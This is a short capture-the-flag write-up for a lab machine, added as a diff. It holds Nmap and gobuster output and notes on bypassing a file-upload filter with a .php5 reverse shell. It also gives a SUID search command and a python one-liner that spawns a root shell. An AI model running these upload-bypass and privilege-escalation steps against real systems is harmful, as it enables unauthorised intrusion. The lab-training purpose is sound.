@@ -1,0 +1,76 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 12:28 CEST
+Nmap scan report for 10.10.121.159
+Host is up (0.037s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
+|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
+|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: HackIT - Home
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=4/24%OT=22%CT=1%CU=44425%PV=Y%DS=2%DC=T%G=Y%TM=644659F
+OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
+OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   36.03 ms 10.9.0.1
+2   52.44 ms 10.10.121.159
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.17 seconds
+
+gobuster dir -u http://10.10.121.159 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.121.159
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/04/24 12:31:07 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/uploads              (Status: 301) [Size: 316] [--> http://10.10.121.159/uploads/]
+[2K/css                  (Status: 301) [Size: 312] [--> http://10.10.121.159/css/]
+[2K/js                   (Status: 301) [Size: 311] [--> http://10.10.121.159/js/]
+[2K/panel                (Status: 301) [Size: 314] [--> http://10.10.121.159/panel/]
+
+Used pentestmonkey reverse shell with php5 extension to bypass .php block
+
+found the flag in user.txt with the command: 
+
+find -name 'user.txt'
+
+found SUID files with the command:
+
+find / -user root -perm /4000
+
+python has the SUID bit set, went on gtfobins to find a way to privesc:
+
+1) navigated to /usr/bin where python is located
+2) executed the command: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+3) with the root shell entered /root for the flag
